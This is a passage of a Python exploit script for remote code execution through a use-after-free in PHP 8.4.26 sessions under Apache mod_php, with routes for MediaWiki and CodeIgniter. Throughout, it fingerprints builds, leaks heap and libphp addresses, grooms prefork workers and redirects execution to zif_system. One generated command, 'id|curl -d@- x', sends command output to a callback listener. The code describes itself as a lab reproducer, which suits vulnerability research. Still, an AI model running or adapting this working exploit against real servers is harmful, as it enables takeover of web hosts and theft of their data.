            # A successful one-shot command is followed by worker corruption;
            # the proof check below distinguishes execution from a mere crash.
            pass


def proof_text(path: Path | None) -> str:
    if path is None or not path.exists():
        return ""
    try:
        return path.read_bytes().decode("latin1").strip()
    except OSError:
        return ""


def detect_profile(
    endpoint: HttpEndpoint, registry: ProfileRegistry
) -> tuple[RuntimeProfile, int, bytes]:
    pinned = KeepAliveEndpoint(endpoint)
    try:
        status, headers, initial_body = pinned.get_response(endpoint.path)
    except Exception:
        pinned.close()
        raise
    php_header = headers.get("x-powered-by", "")
    server_header = headers.get("server", "")
    print(
        f"[*] fingerprint status={status} php={php_header or 'hidden'} "
        f"server={server_header or 'hidden'}",
        flush=True,
    )
    candidates = [
        profile
        for profile in registry.profiles.values()
        if profile.auto_select
        and profile.build.php_header == php_header
        and profile.build.server_header == server_header
    ]
    if not candidates:
        pinned.close()
        raise ValueError(
            "no validated registry build matches the observed PHP/server "
            "fingerprint; use --profile-id only after calibrating that exact build"
        )

    try:
        responses: dict[int, bytes] = {}
        matches: list[RuntimeProfile] = []
        for candidate in candidates:
            if candidate.probe_bytes not in responses:
                _, _, _, probe_body = pinned.post(
                    [Part("profile_probe", b"A" * candidate.probe_bytes)],
                    b"PROFILEBOUNDARY",
                )
                responses[candidate.probe_bytes] = probe_body
            raw = responses[candidate.probe_bytes]
            if all(fragment in raw for fragment in candidate.probe_contains):
                matches.append(candidate)
        if len(matches) == 1:
            selected = matches[0]
            print(f"[*] profile calibration -> {selected.id}", flush=True)
            return selected, status, initial_body
        if len(matches) > 1:
            raise ValueError("configuration probe matched multiple registry profiles")
        raise ValueError(
            "known HTTP version signature found, but the bounded configuration "
            "probe did not match a validated registry profile"
        )
    finally:
        pinned.close()


def select_explicit_profile(
    registry: ProfileRegistry, mode: str, profile_id: str
) -> RuntimeProfile:
    if profile_id:
        try:
            selected = registry.profiles[profile_id]
        except KeyError as exc:
            raise ValueError(f"unknown --profile-id {profile_id!r}") from exc
        if mode != "auto" and selected.mode != mode:
            raise ValueError(
                f"--profile {mode!r} conflicts with profile {profile_id!r} "
                f"(mode {selected.mode!r})"
            )
        return selected
    matches = [profile for profile in registry.profiles.values() if profile.mode == mode]
    if len(matches) != 1:
        raise ValueError(
            f"--profile {mode!r} maps to {len(matches)} registry entries; "
            "select one with --profile-id"
        )
    return matches[0]


def resolve_symbol_offsets(
    args: argparse.Namespace,
    profile: RuntimeProfile,
    registry: ProfileRegistry,
) -> tuple[int, int, str, BuildMapping]:
    build = profile.build
    if args.build_id:
        try:
            build = registry.builds[args.build_id]
        except KeyError as exc:
            raise ValueError(f"unknown --build-id {args.build_id!r}") from exc

    zif_offset = build.zif_system
    destructor_offset = build.zval_ptr_dtor
    if build.id == profile.build.id:
        source = f"registry build={build.id}"
    else:
        source = (
            f"candidate registry build={build.id}; "
            f"heap layout remains {profile.layout.id}"
        )

    if args.libphp is not None:
        digest, symbols = parse_elf_symbol_offsets(args.libphp)
        if digest != build.libphp_sha256:
            raise ValueError(
                "--libphp SHA-256 does not match the selected build: "
                f"observed={digest} expected={build.libphp_sha256}"
            )
        zif_offset = symbols["zif_system"]
        destructor_offset = symbols["zval_ptr_dtor"]
        if (
            zif_offset != build.zif_system
            or destructor_offset != build.zval_ptr_dtor
        ):
            raise ValueError("ELF symbol offsets disagree with the selected registry build")
        source = f"verified ELF sha256={digest}"

    legacy = load_offsets(args.offsets_file)
    if args.zif_offset is not None:
        zif_offset = args.zif_offset
        source = "manual CLI override"
    elif "ZIF_OFFSET" in legacy:
        zif_offset = legacy["ZIF_OFFSET"]
        source = "manual offsets file"
    if args.dtor_offset is not None:
        destructor_offset = args.dtor_offset
        source = "manual CLI override"
    elif "DTOR_OFFSET" in legacy:
        destructor_offset = legacy["DTOR_OFFSET"]
        source = "manual offsets file"
    return zif_offset, destructor_offset, source, build


def select_application_route(
    endpoint: HttpEndpoint,
    initial_status: int = 0,
    initial_body: bytes = b"",
) -> str:
    requested_path = urllib.parse.urlsplit(endpoint.path).path
    mediawiki_path = "/extensions/Scribunto/Scribunto.constants.php"
    if requested_path == mediawiki_path:
        return "mediawiki"
    if requested_path not in {"/", "/index.php"}:
        return ""

    if initial_body:
        status, body = initial_status, initial_body
    else:
        status, _, body = endpoint.get_response(endpoint.path, read_limit=1 << 20)
    if status == 200 and (
        b"Welcome to CodeIgniter 4!" in body
        or b"Welcome to CodeIgniter 4." in body
    ):
        print("[*] application route: CodeIgniter 4 default welcome page", flush=True)
        return "codeigniter"

    status, _, body = endpoint.get_response(mediawiki_path, read_limit=4096)
    if status == 200 and body == b"":
        endpoint.path = mediawiki_path
        print(f"[*] application route: MediaWiki -> {mediawiki_path}", flush=True)
        return "mediawiki"
    return ""


def remote_output_mapping(
    endpoint: HttpEndpoint, application: str, compact: bool = False
) -> tuple[str, str]:
    if application == "mediawiki" or compact:
        alphabet = string.ascii_lowercase + string.digits
        name = "".join(secrets.choice(alphabet) for _ in range(2))
    else:
        name = "p" + secrets.token_hex(4)

    if application == "mediawiki":
        return f"images/{name}", f"/images/{name}"

    target_path = urllib.parse.urlsplit(endpoint.path).path or "/"
    target_dir = target_path.rsplit("/", 1)[0]
    return name, f"{target_dir}/{name}"


def parser() -> argparse.ArgumentParser:
    cli = argparse.ArgumentParser(
        description="Reproduce the PHP 8.4.26 mod_php session UAF chain",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    cli.add_argument("--url", help="PHP endpoint in the isolated lab")
    cli.add_argument(
        "--profiles-file",
        type=Path,
        default=DEFAULT_PROFILES_FILE,
        help="versioned build/layout registry",
    )
    cli.add_argument("--profile-id", default="", help="exact registry profile id")
    cli.add_argument(
        "--build-id",
        default="",
        help=(
            "explicit registry symbol-map candidate; retains the selected "
            "profile's heap layout without claiming binary compatibility"
        ),
    )
    cli.add_argument(
        "--list-profiles",
        action="store_true",
        help="list registry profiles and exit without contacting a target",
    )
    cli.add_argument(
        "--list-builds",
        action="store_true",
        help="list mapped binaries, including builds without a calibrated layout",
    )
    cli.add_argument(
        "--inspect-libphp",
        type=Path,
        help="print SHA-256 and ELF symbol offsets without selecting a profile",
    )
    cli.add_argument(
        "--check-profile",
        action="store_true",
        help="resolve and validate the selected profile, then exit before exploitation",
    )
    cli.add_argument(
        "--profile",
        choices=("auto", "lab", "stock", "stock-session"),
        default="auto",
        help=(
            "auto-detect the validated HTTP signature and memory profile, or "
            "select stock PHP/Apache, the tuned 8M lab, or the legacy stock "
            "endpoint with native session_start"
        ),
    )
    # The public reproducer deliberately has no arbitrary command option.  Its
    # fixed, self-checking proof still exercises the complete zif_system chain.
    cli.set_defaults(command=None)
    cli.add_argument(
        "--proof-file",
        type=Path,
        default=None,
        help=(
            "optional host-visible proof file for a mounted local lab; when "
            "omitted, use the selected application's bounded HTTP output mapping"
        ),
    )
    cli.add_argument("--fetch", default="", help="optional HTTP path containing proof")
    cli.add_argument(
        "--expect-proof",
        default="",
        help="text required in local or fetched proof; remote default is uid=",
    )
    cli.add_argument(
        "--libphp",
        type=Path,
        help="exact local libphp.so; verify its SHA-256 and extract ELF symbols",
    )
    cli.add_argument(
        "--offsets-file",
        type=Path,
        help="legacy manual ZIF_OFFSET/DTOR_OFFSET override",
    )
    cli.add_argument("--zif-offset", type=lambda value: int(value, 0))
    cli.add_argument("--dtor-offset", type=lambda value: int(value, 0))
    cli.add_argument("--hash-offset", type=lambda value: int(value, 0))
    cli.add_argument(
        "--huge-mb",
        type=int,
        help="chunked producer size; defaults to 140 for stock and 12 for lab",
    )
    cli.add_argument("--timeout", type=float, default=30.0)
    cli.add_argument(
        "--retries",
        type=int,
        help=(
            "bounded attempts; defaults to 24 for stock/MediaWiki and 3 for "
            "the tuned or legacy profiles"
        ),
    )
    cli.add_argument(
        "--skip-warmup",
        action="store_true",
        help="skip the stock profile's ordinary GET before heap calibration",
    )
    cli.add_argument("--skip-initial-reset", action="store_true")
    cli.add_argument(
        "--prefork-workers",
        type=int,
        default=0,
        help=(
            "pin this many Apache prefork workers per stage; the default "
            "CodeIgniter fixture auto-selects five"
        ),
    )
    cli.add_argument(
        "--callback-bind",
        default="0.0.0.0",
        help="listener address for CodeIgniter's id stdout",
    )
    cli.add_argument(
        "--callback-port",
        type=int,
        default=80,
        help="host callback port reached through the lab's x host alias (must be 80)",
    )
    return cli


def read_proof(
    endpoint: HttpEndpoint,
    proof_path: Path | None,
    fetch_path: str,
    expected: str,
    callback: CallbackProof | None = None,
    callback_timeout: float = 0.0,
) -> str:
    if callback is not None:
        proof = callback.wait(callback_timeout)
        if proof:
            return proof
    proof = proof_text(proof_path)
    if not proof and fetch_path:
        status, body = endpoint.get(fetch_path)
        if status == 200:
            proof = body.decode("latin1").strip()
    if proof and expected and expected not in proof:
        return ""
    return proof


def run_prefork_wave_preapp(
    args: argparse.Namespace,
    endpoint: HttpEndpoint,
    command: bytes,
    proof_path: Path | None,
    callback: CallbackProof | None,
    zif_offset: int,
    destructor_offset: int,
    hash_offset: int,
    layout: LayoutMapping,
) -> int:
    """Turn over a default prefork pool between leak and execution stages."""

    workers = args.prefork_workers
    if workers < 1:
        raise ValueError("prefork worker count must be positive")
    alphabet = string.ascii_lowercase + string.digits

    def new_session() -> bytes:
        return "".join(
            secrets.choice(alphabet) for _ in range(layout.session_id_length)
        ).encode("ascii")

    def open_wave(
        count: int = workers,
    ) -> tuple[list[ChunkedKeepAliveEndpoint], list[Reproducer]]:
        transports = [ChunkedKeepAliveEndpoint(endpoint) for _ in range(count)]
        try:
            # Merely connecting pins one idle prefork child per transport.  No
            # request bytes are sent until every worker has been reserved.
            for transport in transports:
                transport.connection.connect()
            time.sleep(0.2)
            runs = [
                Reproducer(
                    transport,
                    command,
                    zif_offset,
                    destructor_offset,
                    args.huge_mb,
                    layout,
                    new_session(),
                )
                for transport in transports
            ]
            return transports, runs
        except Exception:
            for transport in transports:
                transport.close()
            raise

    def close_wave(transports: list[ChunkedKeepAliveEndpoint]) -> None:
        for transport in transports:
            transport.close()

    def leak_wave(method_name: str) -> int:
        transports, runs = open_wave()

        def invoke(index: int) -> tuple[int, int, str]:
            try:
                return index, getattr(runs[index], method_name)(), ""
            except Exception as exc:  # each pinned worker is an independent trial
                return index, 0, f"{type(exc).__name__}: {exc}"

        try:
            with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as pool:
                results = list(pool.map(invoke, range(workers)))
            summary = [
                (index, f"0x{value:x}" if value else "", error)
                for index, value, error in results
            ]
            print(f"[*] {method_name} worker wave: {summary}", flush=True)

            # A successful consumer remains alive but its allocator history is
            # unsuitable for the next primitive.  Kill that exact worker over
            # its pinned socket; Apache replaces it with a clean fork that has
            # the same ASLR bases as the parent.
            for index, value, _ in results:
                if not value:
                    continue
                try:
                    runs[index].reset_worker()
                except Exception:
                    pass
        finally:
            close_wave(transports)

        values = [value for _, value, _ in results if value]
        time.sleep(1.0)
        if not values:
            return 0
        value, count = Counter(values).most_common(1)[0]
        if count != len(values):
            print(
                f"[!] {method_name} discarded {len(values) - count} "
                "non-consensus result(s)",
                flush=True,
            )
        return value

    def reset_wave() -> None:
        # Apache's stock MaxSpareServers is twice StartServers.  Reserve that
        # complete idle set before turnover so fingerprint/application probes
        # cannot leave a dirty child behind for the first leak wave.
        reset_count = workers * 2
        transports, runs = open_wave(reset_count)

        def reset(index: int) -> tuple[int, str]:
            try:
                runs[index].reset_worker()
                return index, "returned"
            except Exception as exc:
                return index, f"{type(exc).__name__}: {exc}"

        try:
            # Keep the requests sequential while all sockets stay pinned.  A
            # concurrent reset would allocate reset_count huge request bodies.
            results = [reset(index) for index in range(reset_count)]
            print(f"[*] prefork reset wave: {results}", flush=True)
        finally:
            close_wave(transports)
        time.sleep(1.0)

    if not args.skip_initial_reset:
        reset_wave()

    heap = 0
    for attempt in range(1, args.retries + 1):
        print(f"[*] heap worker wave {attempt}/{args.retries}", flush=True)
        heap = leak_wave("leak_heap")
        if heap:
            break
    if not heap:
        print("PREAPP_HEAP_WAVE_FAILED", file=sys.stderr)
        return 1
    print(f"[+] heap chunk base: 0x{heap:x}", flush=True)

    libphp = 0
    for attempt in range(1, args.retries + 1):
        print(f"[*] libphp worker wave {attempt}/{args.retries}", flush=True)
        libphp = leak_wave("leak_libphp")
        if libphp:
            break
    if not libphp:
        print("PREAPP_LIBPHP_WAVE_FAILED", file=sys.stderr)
        return 1
    print(f"[+] libphp base: 0x{libphp:x}", flush=True)

    fake_table = heap + hash_offset
    zif_system = libphp + zif_offset
    print(
        f"[*] execution addresses: table=0x{fake_table:x} "
        f"zif_system=0x{zif_system:x}",
        flush=True,
    )

    for attempt in range(1, args.retries + 1):
        print(f"[*] execution worker wave {attempt}/{args.retries}", flush=True)
        transports, runs = open_wave()

        def execute(index: int) -> tuple[int, str]:
            try:
                runs[index].execute(fake_table, zif_system)
                return index, "returned"
            except Exception as exc:
                return index, f"{type(exc).__name__}: {exc}"

        try:
            with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as pool:
                execution = list(pool.map(execute, range(workers)))
            print(f"[*] execution worker wave: {execution}", flush=True)
        finally:
            close_wave(transports)

        proof = read_proof(
            endpoint,
            proof_path,
            args.fetch,
            args.expect_proof,
            callback,
            callback_timeout=5.0,
        )
        if proof:
            print(f"PROOF: {proof}")
            if proof_path is None and args.fetch:
                print(f"REMOTE_PROOF_REMAINS: {args.fetch}")
            return 0

    print("PREAPP_RCE_NOT_PROVEN", file=sys.stderr)
    return 1


def run_stock_session(
    args: argparse.Namespace,
    endpoint: HttpEndpoint,
    command: bytes,
    proof_path: Path | None,
    zif_offset: int,
    destructor_offset: int,
    hash_offset: int,
    layout: LayoutMapping,
    session_id: bytes,
) -> int:
    for attempt in range(1, args.retries + 1):
        print(f"[*] stock attempt {attempt}/{args.retries}", flush=True)
        run = StockReproducer(
            endpoint,
            command,
            zif_offset,
            destructor_offset,
            hash_offset,
            layout,
            session_id,
        )
        try:
            heap, libphp = run.leak_addresses()
            if not heap or not libphp:
                print("[!] stock address leak did not reproduce", flush=True)
                continue
            print(f"[+] heap chunk base: 0x{heap:x}", flush=True)
            print(f"[+] libphp base: 0x{libphp:x}", flush=True)
            print(
                f"[*] execution addresses: table=0x{heap + hash_offset:x} "
                f"zif_system=0x{libphp + zif_offset:x}",
                flush=True,
            )
            run.execute(heap, libphp)
        except (ConnectionError, http.client.HTTPException, OSError, RuntimeError) as exc:
            print(f"[!] stock attempt ended: {type(exc).__name__}: {exc}", flush=True)
        finally:
            run.close()

        time.sleep(0.8)
        proof = read_proof(endpoint, proof_path, args.fetch, args.expect_proof)
        if proof:
            print(f"PROOF: {proof}")
            if proof_path is None:
                print(f"REMOTE_PROOF_REMAINS: {args.fetch}")
            return 0

    print("STOCK_RCE_NOT_PROVEN", file=sys.stderr)
    return 1


def run_stock_preapp(
    args: argparse.Namespace,
    endpoint: HttpEndpoint,
    command: bytes,
    proof_path: Path | None,
    zif_offset: int,
    destructor_offset: int,
    hash_offset: int,
    layout: LayoutMapping,
    session_id: bytes,
) -> int:
    if not args.skip_warmup:
        try:
            status, _ = endpoint.get(endpoint.path, read_limit=1 << 20)
            print(f"[*] warm-up GET status={status}", flush=True)
        except (ConnectionError, OSError) as exc:
            print(f"[!] warm-up GET ended: {type(exc).__name__}: {exc}", flush=True)

    heap = 0
    for attempt in range(1, args.retries + 1):
        print(f"[*] pre-app heap attempt {attempt}/{args.retries}", flush=True)
        transport = ChunkedKeepAliveEndpoint(endpoint)
        run = Reproducer(
            transport,
            command,
            zif_offset,
            destructor_offset,
            args.huge_mb,
            layout,
            session_id,
        )
        try:
            heap = run.leak_heap()
        except (ConnectionError, http.client.HTTPException, OSError, RuntimeError) as exc:
            print(f"[!] heap attempt ended: {type(exc).__name__}: {exc}", flush=True)
        finally:
            transport.close()
        if heap:
            print(f"[+] heap chunk base: 0x{heap:x}", flush=True)
            break
    if not heap:
        print("PREAPP_HEAP_LEAK_FAILED", file=sys.stderr)
        return 1

    libphp = 0
    for attempt in range(1, args.retries + 1):
        print(f"[*] pre-app libphp attempt {attempt}/{args.retries}", flush=True)
        transport = ChunkedKeepAliveEndpoint(endpoint)
        run = Reproducer(
            transport,
            command,
            zif_offset,
            destructor_offset,
            args.huge_mb,
            layout,
            session_id,
        )
        try:
            libphp = run.leak_libphp()
        except (ConnectionError, http.client.HTTPException, OSError, RuntimeError) as exc:
            print(f"[!] libphp attempt ended: {type(exc).__name__}: {exc}", flush=True)
        finally:
            transport.close()
        if libphp:
            print(f"[+] libphp base: 0x{libphp:x}", flush=True)
            break
    if not libphp:
        print("PREAPP_LIBPHP_LEAK_FAILED", file=sys.stderr)
        return 1

    fake_table = heap + hash_offset
    zif_system = libphp + zif_offset
    print(
        f"[*] execution addresses: table=0x{fake_table:x} "
        f"zif_system=0x{zif_system:x}",
        flush=True,
    )
    for attempt in range(1, args.retries + 1):
        print(f"[*] pre-app execution attempt {attempt}/{args.retries}", flush=True)
        transport = ChunkedKeepAliveEndpoint(endpoint)
        run = Reproducer(
            transport,
            command,
            zif_offset,
            destructor_offset,
            args.huge_mb,
            layout,
            session_id,
        )
        try:
            run.execute(fake_table, zif_system)
        except (ConnectionError, http.client.HTTPException, OSError, RuntimeError) as exc:
            print(
                f"[!] execution attempt ended: {type(exc).__name__}: {exc}",
                flush=True,
            )
        finally:
            transport.close()
        time.sleep(0.8)
        should_check_proof = (
            not args.defer_remote_proof
            or attempt % args.remote_proof_interval == 0
            or attempt == args.retries
        )
        if should_check_proof:
            if args.defer_remote_proof:
                print(f"[*] checking remote proof after attempt {attempt}", flush=True)
            proof = read_proof(endpoint, proof_path, args.fetch, args.expect_proof)
            if proof:
                print(f"PROOF: {proof}")
                if proof_path is None:
                    print(f"REMOTE_PROOF_REMAINS: {args.fetch}")
                return 0

    print("PREAPP_RCE_NOT_PROVEN", file=sys.stderr)
    return 1


def main() -> int:
    cli = parser()
    args = cli.parse_args()
    try:
        registry = load_profile_registry(args.profiles_file)
    except ValueError as exc:
        print(f"PROFILE_REGISTRY_FAILED: {exc}", file=sys.stderr)
        return 2

    if args.list_profiles:
        for profile in sorted(registry.profiles.values(), key=lambda item: item.id):
            print(
                f"{profile.id}\tmode={profile.mode}\tbuild={profile.build.id}\t"
                f"layout={profile.layout.id}\tauto={str(profile.auto_select).lower()}"
            )
        return 0
    if args.list_builds:
        for build in sorted(registry.builds.values(), key=lambda item: item.id):
            profile_count = sum(
                profile.build.id == build.id for profile in registry.profiles.values()
            )
            print(
                f"{build.id}\tsha256={build.libphp_sha256}\t"
                f"zif=0x{build.zif_system:x}\tdtor=0x{build.zval_ptr_dtor:x}\t"
                f"profiles={profile_count}"
            )
        return 0
    if args.inspect_libphp is not None:
        try:
            digest, symbols = parse_elf_symbol_offsets(args.inspect_libphp)
        except (OSError, ValueError, struct.error) as exc:
            print(f"LIBPHP_INSPECTION_FAILED: {exc}", file=sys.stderr)
            return 2
        print(
            f"LIBPHP sha256={digest} zif_system=0x{symbols['zif_system']:x} "
            f"zval_ptr_dtor=0x{symbols['zval_ptr_dtor']:x}"
        )
        return 0
    if not args.url:
        cli.error(
            "--url is required unless --list-profiles, --list-builds, or "
            "--inspect-libphp is used"
        )

    try:
        endpoint = HttpEndpoint(args.url, args.timeout)
        initial_status = 0
        initial_body = b""
        if args.profile == "auto" and not args.profile_id:
            runtime_profile, initial_status, initial_body = detect_profile(
                endpoint, registry
            )
        else:
            runtime_profile = select_explicit_profile(
                registry, args.profile, args.profile_id
            )
            print(f"[*] explicit registry profile -> {runtime_profile.id}", flush=True)
        zif_offset, destructor_offset, symbol_source, symbol_build = (
            resolve_symbol_offsets(args, runtime_profile, registry)
        )
    except (ConnectionError, OSError, ValueError, struct.error) as exc:
        print(f"PROFILE_DETECTION_FAILED: {exc}", file=sys.stderr)
        return 2

    args.profile = runtime_profile.mode
    layout = runtime_profile.layout
    hash_offset = (
        args.hash_offset if args.hash_offset is not None else layout.hash_offset
    )
    print(
        f"[*] profile={runtime_profile.id} build={runtime_profile.build.id} "
        f"layout={layout.id}",
        flush=True,
    )
    print(
        f"[*] offsets source={symbol_source} zif=0x{zif_offset:x} "
        f"dtor=0x{destructor_offset:x} hash=0x{hash_offset:x}",
        flush=True,
    )
    if args.check_profile:
        print(
            f"PROFILE_OK image={symbol_build.image_digest} "
            f"libphp_sha256={symbol_build.libphp_sha256} "
            f"symbols_build={symbol_build.id}"
        )
        return 0

    session_alphabet = string.ascii_lowercase + string.digits
    session_id = "".join(
        secrets.choice(session_alphabet) for _ in range(layout.session_id_length)
    ).encode("ascii")
    application = select_application_route(endpoint, initial_status, initial_body)
    if application == "codeigniter" and args.prefork_workers == 0:
        args.prefork_workers = 5
        print("[*] prefork worker wave: auto-selected 5 workers", flush=True)
    if application == "codeigniter" and not args.skip_initial_reset:
        args.skip_initial_reset = True
        print("[*] prefork reset wave: skipped; four workers remain pristine", flush=True)
    if args.retries is None:
        if application == "codeigniter":
            args.retries = 3
        elif application == "mediawiki":
            args.retries = 24
        elif args.profile == "stock":
            args.retries = 24
        else:
            args.retries = 3
    proof_path = args.proof_file.resolve() if args.proof_file else None
    args.defer_remote_proof = application == "mediawiki" and proof_path is None
    args.remote_proof_interval = 6
    args.auto_capture = False
    args.generated_remote_proof = False
    args.generated_callback_proof = False
    if (
        application == "codeigniter"
        and args.command is None
        and proof_path is None
        and not args.fetch
    ):
        if args.callback_port != 80:
            cli.error("CodeIgniter's 14-byte `id` proof requires --callback-port 80")
        args.command = "id|curl -d@- x"
        args.generated_callback_proof = True
        print(
            f"[*] proof command: {args.command}; "
            f"id stdout listener={args.callback_bind}:{args.callback_port}",
            flush=True,
        )

    if (
        args.command is not None
        and proof_path is None
        and not args.fetch
        and not args.generated_callback_proof
    ):
        requested_command = args.command
        write_path, args.fetch = remote_output_mapping(
            endpoint, application, compact=True
        )
        args.command = f"{requested_command}>{write_path}"
        capture_size = len(args.command.encode())
        if capture_size <= layout.auto_capture_command_size:
            args.command += " " * (layout.auto_capture_command_size - capture_size)
        args.auto_capture = True
        args.generated_remote_proof = True
        print(f"[*] remote command output: {args.fetch}", flush=True)

    if args.command is None and proof_path is not None:
        proof_name = proof_path.name
        if not re.fullmatch(r"[A-Za-z0-9._-]+", proof_name):
            cli.error("--proof-file must end in a simple filename for the default command")
        args.command = f"id>/out/{proof_name}"
    elif args.command is None:
        if args.fetch:
            remote_name = urllib.parse.urlsplit(args.fetch).path.rsplit("/", 1)[-1]
            if not re.fullmatch(r"[A-Za-z0-9._-]+", remote_name):
                cli.error("--fetch must end in a simple filename in remote proof mode")
            args.command = f"id>{remote_name}"
        elif application == "mediawiki":
            write_path, args.fetch = remote_output_mapping(endpoint, application)
            args.command = f"id>{write_path}"
            args.generated_remote_proof = True
        elif args.profile == "lab":
            print(
                "REMOTE_PROOF_MAPPING_REQUIRED: use --proof-file or provide a "
                "verified --command/--fetch mapping",
                file=sys.stderr,
            )
            return 2
        else:
            write_path, args.fetch = remote_output_mapping(endpoint, application)
            args.command = f"id>{write_path}"
            args.generated_remote_proof = True
        if not args.expect_proof:
            args.expect_proof = "uid="
        print(f"[*] remote proof path: {args.fetch}", flush=True)
    elif proof_path is None and not args.generated_callback_proof:
        if not args.fetch:
            cli.error("--command without --proof-file requires --fetch")
        if not args.expect_proof and not args.auto_capture:
            cli.error("remote proof with a custom --command requires --expect-proof")

    command = args.command.encode()
    if len(command) > layout.command_limit:
        cli.error(f"--command is limited to {layout.command_limit} bytes")

    if proof_path is None and not args.generated_callback_proof:
        try:
            pre_status, _, pre_body = endpoint.get_response(args.fetch)
        except (ConnectionError, OSError) as exc:
            print(f"REMOTE_PROOF_PREFLIGHT_FAILED: {exc}", file=sys.stderr)
            return 2
        pre_text = pre_body.decode("latin1", errors="replace")
        # Some applications rewrite every missing path to a 200 front
        # controller response.  A required proof marker still gives us a
        # freshness invariant in that case; status alone does not.
        if args.generated_remote_proof and pre_status == 200 and not args.expect_proof:
            print("REMOTE_PROOF_PATH_NOT_FRESH", file=sys.stderr)
            return 2
        if args.expect_proof and args.expect_proof in pre_text:
            print("REMOTE_PROOF_COLLISION", file=sys.stderr)
            return 2
        print(f"[*] remote proof preflight status={pre_status}", flush=True)

    if args.retries < 1:
        cli.error("--retries must be positive")
    if args.huge_mb is None:
        args.huge_mb = runtime_profile.huge_megabytes
    if args.huge_mb < runtime_profile.minimum_huge_megabytes:
        cli.error(
            f"--huge-mb must be at least "
            f"{runtime_profile.minimum_huge_megabytes} for {runtime_profile.id}"
        )

    if proof_path is not None:
        try:
            proof_path.unlink(missing_ok=True)
        except OSError as exc:
            print(f"PROOF_PREP_FAILED: {exc}", file=sys.stderr)
            return 2
    callback: CallbackProof | None = None
    if args.generated_callback_proof:
        try:
            callback = CallbackProof(
                args.callback_bind,
                args.callback_port,
            )
            callback.start()
        except OSError as exc:
            print(f"CALLBACK_LISTENER_FAILED: {exc}", file=sys.stderr)
            return 2

    try:
        if args.profile == "stock":
            if args.prefork_workers:
                return run_prefork_wave_preapp(
                    args,
                    endpoint,
                    command,
                    proof_path,
                    callback,
                    zif_offset,
                    destructor_offset,
                    hash_offset,
                    layout,
                )
            return run_stock_preapp(
                args,
                endpoint,
                command,
                proof_path,
                zif_offset,
                destructor_offset,
                hash_offset,
                layout,
                session_id,
            )
        if args.profile == "stock-session":
            return run_stock_session(
                args,
                endpoint,
                command,
                proof_path,
                zif_offset,
                destructor_offset,
                hash_offset,
                layout,
                session_id,
            )

        run = Reproducer(
            endpoint,
            command,
            zif_offset,
            destructor_offset,
            args.huge_mb,
            layout,
            session_id,
        )
        if not args.skip_initial_reset:
            run.reset_worker()

        heap = 0
        for attempt in range(1, args.retries + 1):
            print(f"[*] heap leak attempt {attempt}/{args.retries}", flush=True)
            heap = run.leak_heap()
            if heap:
                print(f"[+] heap chunk base: 0x{heap:x}", flush=True)
                break
            run.reset_worker()
        if not heap:
            print("HEAP_LEAK_FAILED", file=sys.stderr)
            return 1

        run.reset_worker()
        libphp = 0
        for attempt in range(1, args.retries + 1):
            print(f"[*] libphp leak attempt {attempt}/{args.retries}", flush=True)
            libphp = run.leak_libphp()
            if libphp:
                print(f"[+] libphp base: 0x{libphp:x}", flush=True)
                break
            run.reset_worker()
        if not libphp:
            print("LIBPHP_LEAK_FAILED", file=sys.stderr)
            return 1

        run.reset_worker()
        fake_table = heap + hash_offset
        zif_system = libphp + zif_offset
        print(
            f"[*] execution addresses: table=0x{fake_table:x} zif_system=0x{zif_system:x}",
            flush=True,
        )

        for attempt in range(1, args.retries + 3):
            print(f"[*] execution attempt {attempt}/{args.retries + 2}", flush=True)
            run.execute(fake_table, zif_system)
            time.sleep(0.8)
            proof = read_proof(
                endpoint, proof_path, args.fetch, args.expect_proof, callback
            )
            if proof:
                print(f"PROOF: {proof}")
                if proof_path is None and args.fetch:
                    print(f"REMOTE_PROOF_REMAINS: {args.fetch}")
                return 0
            run.reset_worker()

        print("RCE_NOT_PROVEN", file=sys.stderr)
        return 1
    finally:
        if callback is not None:
            callback.close()


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except KeyboardInterrupt:
        raise SystemExit(130)
